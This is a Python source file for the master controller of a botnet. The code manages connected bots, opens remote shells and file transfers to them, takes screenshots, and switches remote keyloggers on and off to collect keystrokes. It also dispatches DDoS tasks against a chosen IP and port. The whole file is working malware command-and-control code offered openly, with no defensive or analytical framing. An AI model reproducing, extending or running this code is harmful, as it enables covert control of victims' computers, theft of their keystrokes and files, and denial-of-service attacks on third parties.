# Date: 06/07/2018
# Author: Pure-L0G1C
# Description: Interface for the master

from os import path
from re import match
from lib import const
from . import ssh, sftp
from hashlib import sha256
from time import time, sleep
from os import urandom, path
from threading import Thread
from datetime import datetime

class FTP(object):

    def __init__(self, file, bot, download=True):
        self.sftp = sftp.sFTP(const.PRIVATE_IP, const.FTP_PORT, max_time=60, verbose=True)
        self.bot_id = bot['bot_id']
        self.shell = bot['shell']
        self.download = download
        self.is_alive = False
        self.success = False
        self.time = None
        self.file = file

    def send(self, code, file=None):
        if not path.exists(file):return
        self.shell.send(code=code, args=file)
        self.is_alive = True
        self.sftp.send(file)
        self.is_alive = False
        self.time = self.sftp.time_elapsed
        self.success = True if self.sftp.error_code != -1 else False

    def recv(self, code, file=None):
        self.shell.send(code=code, args=file)
        self.is_alive = True
        self.sftp.recv()
        self.is_alive = False
        self.time = self.sftp.time_elapsed
        self.success = True if self.sftp.error_code != -1 else False

    def close(self):
        self.sftp.close()

######## Tasks #########

class Task(object):

    def __init__(self, task_id, task_args, task_info_obj):
        self.id = task_id
        self.args = task_args
        self.task_info_obj = task_info_obj

    def start(self, bots):
        for bot in [bots[bot] for bot in bots]:
            bot['shell'].send(10, (self.id, self.args))

    def stop(self, bots):
        for bot in [bots[bot] for bot in bots]:
            bot['shell'].send(11)

class TaskDdos(object):

    def __init__(self, target, threads):
        self.target = target
        self.threads = threads
        self.time_assigned = time()

    def info(self):
        time_assigned = datetime.fromtimestamp(self.time_assigned).strftime('%b %d, %Y at %I:%M %p')
        a = 'Task name: Ddos Attack\nTime assigned: {}\n\n'.format(time_assigned)
        b = 'Target: {}\nThreads: {}'.format(self.target, self.threads)
        return a + b

######## Interface ########

class Interface(object):

    def __init__(self):
        self.bots = {}
        self.ssh = None
        self.ftp = None
        self.task = None
        self.sig = self.signature

    def close(self):
        if self.ftp:
            self.ftp.close()
            self.ftp = None
        if self.ssh:
            self.ssh.close()
            self.ssh = None
        self.disconnect_all()

    def gen_bot_id(self, uuid):
        bot_ids = [self.bots[bot]['bot_id'] for bot in self.bots]
        while 1:
            bot_id = sha256((sha256(urandom(64 * 32) + urandom(64 * 64)).digest().hex() + uuid).encode()).digest().hex()
            if not bot_id in bot_ids:break
        return bot_id

    @property
    def signature(self):
        bots = b''
        for bot in self.bots:
            bot_id = self.bots[bot]['bot_id']
            bot_id = bot_id[:8] + bot_id[-8:]
            bots += bot_id.encode()
        return sha256(bots).digest().hex()

    def is_connected(self, uuid):
        for bot in self.bots:
            if self.bots[bot]['uuid'] == uuid:
                return True
        return False

    def connect_client(self, sess_obj, conn_info, shell):
        uuid = conn_info['args']['sys_info']['uuid']

        if self.is_connected(uuid):
            self.close_sess(sess_obj, shell)
        else:
            bot_id = self.gen_bot_id(uuid)
            self.bots[sess_obj] = { 'bot_id': bot_id, 'uuid': uuid, 'intel': conn_info['args'], 'shell': shell, 'session': sess_obj }
            self.sig = self.signature
            print(self.bots)
            if self.task:
                shell.send(10, (self.task.id, self.task.args))

    def close_sess(self, sess_obj, shell_obj):
        print('Closing session ...')
        shell_obj.is_alive = False
        shell_obj.send(code=7, args=None) # 7 - disconnect

        sess_obj.close()
        if sess_obj in self.bots:
            del self.bots[sess_obj]
        self.sig = self.signature

    def disconnect_client(self, sess_obj):
        print('Disconnecting client ...')
        if sess_obj in self.bots:
            self.bots[sess_obj]['shell'].is_alive = False
            bot_id = self.bots[sess_obj]['bot_id']

            if self.ftp:
                if self.ftp.bot_id == bot_id:
                    self.ftp.close()
                    self.ftp = None

            self.close_sess(sess_obj, self.bots[sess_obj]['shell'])
            self.sig = self.signature

    def disconnect_all(self):
        for bot in [self.bots[bot] for bot in self.bots]:
            bot['session'].close()
        self.sig = self.signature

    def get_bot(self, bot_id):
        for bot in self.bots:
            if self.bots[bot]['bot_id'] == bot_id:
                return self.bots[bot]

    def ssh_obj(self, bot_id):
        bot = self.get_bot(bot_id)

        if bot:
            if self.ssh:
                self.ssh.close()

            self.ssh = ssh.SSH(const.PRIVATE_IP, const.SSH_PORT, max_time=30, verbose=True)
            sock_obj = self.ssh.start()

            if sock_obj:
                t = Thread(target=self.ssh.serve, args=[sock_obj])
                t.daemon = True
                t.start()

                bot['session'].send(code=1)
                return self.ssh
            else:
                self.ssh.close()
                self.ssh = None

    def ssh_exe(self, cmd):
        return self.ssh.send(cmd)

    def ftp_obj(self, bot_id, cmd_id, file, override):
        bot = self.get_bot(bot_id)
        if not bot:
            return ''

        if cmd_id == 3:
            if not path.exists(file):
                return 'Upload process failed; the file {} was not found'.format(file)

        if self.ftp:
            if all([self.ftp.is_alive, not override]):
                return 'Already {} {} {} {}. Use --override option to override this process'.format('Downloading' if self.ftp.download else 'Uploading',
                                           self.ftp.file, 'from' if self.ftp.download else 'to', self.ftp.bot_id[:8])
            else:
                self.ftp.close()

        self.ftp = ftp_obj = FTP(file, bot, download=False if cmd_id == 3 else True)
        ftp_func = self.ftp.send if cmd_id == 3 else self.ftp.recv
        ftp_thread = Thread(target=ftp_func, args=[cmd_id, file])
        ftp_thread.daemon = True
        ftp_thread.start()

        return '{} process started successfully'.format('Download' if self.ftp.download else 'Upload')

    def ftp_status(self):
        if not self.ftp:
            return 'No file transfer in progress'
        if self.ftp.is_alive:
            return '{} {} {} {}. Check back in 1 minute'.format('Downloading' if self.ftp.download else 'Uploading',
                                        self.ftp.file, 'from' if self.ftp.download else 'to', self.ftp.bot_id[:8])
        else:
            return 'Attempted to {} {} {} {}. The process {} a success. Time-elapsed: {}(sec)'.format('download' if self.ftp.download else 'upload',
                                        self.ftp.file, 'from' if self.ftp.download else 'to',
                                        self.ftp.bot_id[:8], 'was' if self.ftp.success else 'was not', self.ftp.time)

    def execute_cmd_by_id(self, bot_id, cmd_id, args):
        override = True if '--override' in args else False
        if not cmd_id.isdigit():
            return 'Failed to send command'

        cmd_id = int(cmd_id)

        if override:
            args.pop(args.index('--override'))

        if cmd_id == 1:
            return self.ftp_status()
        elif any([cmd_id == 3, cmd_id == 4, cmd_id == 5]):
            return self.ftp_obj(bot_id, cmd_id, ' '.join(args[0:]) if cmd_id != 5 else 'a screenshot', override)
        else:
            bot = self.get_bot(bot_id)
            if bot:
                bot['shell'].send(code=cmd_id, args=args)
                if cmd_id == 12:
                    if not bot['shell'].keylogging:
                        bot['shell'].keylogging = True
                    else:
                        return 'Keylogger is already active'
                if cmd_id == 13:
                    if bot['shell'].keylogging:
                        bot['shell'].keylogging = False
                    else:
                        return 'Keylogger is already inactive'
                if all([cmd_id == 14, not bot['shell'].keylogging]):
                    return 'Keylogger is inactive'
                return self.keystrokes(bot['shell']) if cmd_id == 14 else 'Command sent successfully'
        return 'Failed to send command'

    def keystrokes(self, bot_shell):
        while all([bot_shell.is_alive, not bot_shell.keystrokes]):
            pass
        try:
            if all([bot_shell.is_alive, bot_shell.keystrokes]):
                keystrokes = bot_shell.keystrokes
                bot_shell.keystrokes = None
                return keystrokes if keystrokes != '-1' else ''
        except:
            pass

    def start_task(self):
        Thread(target=self.task.start, args=[self.bots], daemon=True).start()

    def stop_task(self):
        if self.task:
            t = Thread(target=self.task.stop, args=[self.bots], daemon=True)
            t.start()
            t.join()
            self.task = None

    def execute_cmd_by_task_id(self, cmd_id, args):
        if not cmd_id.isdigit():
            return 'Failed to send command'
        cmd_id = int(cmd_id)

        if cmd_id == 0: # stop task
            Thread(target=self.stop_task, daemon=True).start()
            return 'Task terminated' if self.task else 'No task is set'
        elif cmd_id == 1: # status
            return self.get_task()
        else:
            resp = self.set_task(cmd_id, args)
            if resp == True:
                self.start_task()
                return 'Task set successfully'
            else:
                return resp

    def get_task(self):
        return 'No task is set' if not self.task else self.task.task_info_obj.info()

    def set_task(self, task_id, args):
        if task_id == 2: # ddos
            return self.set_ddos_task(args)
        else:
            return 'Failed to set task'

    def set_ddos_task(self, args):
        task_id = 1 # the the bot side
        if not len(args) == 3:
            return 'Invalid amount of arguments'

        ip, port, threads = args

        if not self.valid_ip(ip):
            return 'Invalid IP address'

        if not self.valid_port(port):
            return 'Invalid port'

        if not self.valid_thread(threads):
            return 'Invalid thread'

        task_info_obj = TaskDdos('{}:{}'.format(ip, port), threads)
        self.task = Task(task_id, (ip, int(port), int(threads)), task_info_obj)
        return True

    def valid_thread(self, thread):
        return True if thread.isdigit() else False

    def valid_ip(self, ip):
        return False if not match(r'^(?!0)(?!.*\.$)((1?\d?\d|25[0-5]|2[0-4]\d)(\.|$)){4}$', ip) else True

    def valid_port(self, port):
        _port = str(port).strip()

        if not len(_port):
            return False
        else:
            #  check if number
            for item in _port:
                if not item.isdigit():
                    return False

            # check if number starts with a zero
            if int(_port[0]) == 0:
                return False

            # check if number is larger than 65535
            if int(_port) > 65535:
                return False
            return True
